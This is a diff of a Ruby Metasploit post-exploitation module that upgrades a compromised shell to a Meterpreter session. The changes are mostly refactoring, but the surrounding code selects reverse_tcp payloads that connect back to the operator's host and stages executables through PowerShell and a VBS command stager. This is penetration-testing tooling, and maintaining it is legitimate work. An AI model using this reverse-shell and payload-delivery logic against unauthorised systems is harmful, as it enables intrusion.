@@ -8,7 +8,7 @@ require 'rex'
 require 'msf/core/exploit/powershell'
 require 'msf/core/post/windows/powershell'
 
-class Metasploit3 < Msf::Post
+class MetasploitModule < Msf::Post
   include Exploit::Powershell
   include Post::Windows::Powershell
 
@@ -67,6 +67,10 @@ class Metasploit3 < Msf::Post
       lhost = framework.datastore['LHOST']
     else
       lhost = session.tunnel_local.split(':')[0]
+      if lhost == 'Local Pipe'
+        print_error 'LHOST is "Local Pipe", please manually set the correct IP.'
+        return
+      end
     end
 
     # If nothing else works...
@@ -76,18 +80,18 @@ class Metasploit3 < Msf::Post
 
     # Handle platform specific variables and settings
     case session.platform
-    when /win/i
-      platform = 'win'
+    when 'windows'
+      platform = 'windows'
       payload_name = 'windows/meterpreter/reverse_tcp'
       lplat = [Msf::Platform::Windows]
       larch = [ARCH_X86]
       psh_arch = 'x86'
       vprint_status("Platform: Windows")
-    when /osx/i
+    when 'osx'
       platform = 'python'
       payload_name = 'python/meterpreter/reverse_tcp'
       vprint_status("Platform: OS X")
-    when /solaris/i
+    when 'solaris'
       platform = 'python'
       payload_name = 'python/meterpreter/reverse_tcp'
       vprint_status("Platform: Solaris")
@@ -112,7 +116,7 @@ class Metasploit3 < Msf::Post
         vprint_status("Platform: Python [fallback]")
       end
     end
-    payload_name = datastore['PAYLOAD_OVERWRITE'] if datastore['PAYLOAD_OVERWRITE']
+    payload_name = datastore['PAYLOAD_OVERRIDE'] if datastore['PAYLOAD_OVERRIDE']
     vprint_status("Upgrade payload: #{payload_name}")
 
     if platform.blank?
@@ -135,9 +139,9 @@ class Metasploit3 < Msf::Post
     end
 
     case platform
-    when 'win'
+    when 'windows'
       if session.type == 'powershell'
-        template_path = File.join(Msf::Config.data_directory, 'templates', 'scripts')
+        template_path = Rex::Powershell::Templates::TEMPLATE_DIR
         psh_payload = case datastore['Powershell::method']
                       when 'net'
                         Rex::Powershell::Payload.to_win32pe_psh_net(template_path, payload_data)
@@ -196,8 +200,8 @@ class Metasploit3 < Msf::Post
       :linemax => linemax,
       #:nodelete => true # keep temp files (for debugging)
     }
-    if session.platform =~ /win/i
-      opts[:decoder] = File.join(Msf::Config.data_directory, 'exploits', 'cmdstager', 'vbs_b64')
+    if session.platform == 'windows'
+      opts[:decoder] = File.join(Rex::Exploitation::DATA_DIR, "exploits", "cmdstager", 'vbs_b64')
       cmdstager = Rex::Exploitation::CmdStagerVBS.new(exe)
     else
       opts[:background] = true
